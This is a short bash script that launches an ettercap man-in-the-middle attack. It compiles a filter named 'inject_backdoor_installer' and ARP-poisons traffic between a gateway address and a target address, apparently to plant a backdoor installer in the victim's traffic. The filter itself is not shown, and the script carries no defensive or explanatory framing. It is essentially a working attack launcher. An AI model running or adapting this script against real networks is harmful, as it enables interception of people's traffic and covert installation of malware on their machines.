#! /bin/bash

cd "$(dirname "$0")"
BASE_DIR="$(pwd)"
cd $BASE_DIR

IFACE=${IFACE:-"eth0"}
IP_AP=${IP_AP:-"192.168.0.254"}
IP_TARGET=${IP_TARGET:-"192.168.0.2"}

FILTER_SRC=${FILTER_SRC:-"inject_backdoor_installer.ecf"}
FILTER_DST=${FILTER_DST:-"inject_backdoor_installer.ef"}

echo "Compile filter.."
etterfilter $FILTER_SRC -o $FILTER_DST
echo "Execute ettercap filter with : "
sudo ettercap -q -T -i $IFACE -F $FILTER_DST -M arp:remote /$IP_AP/ /$IP_TARGET/

echo "Program ending.."
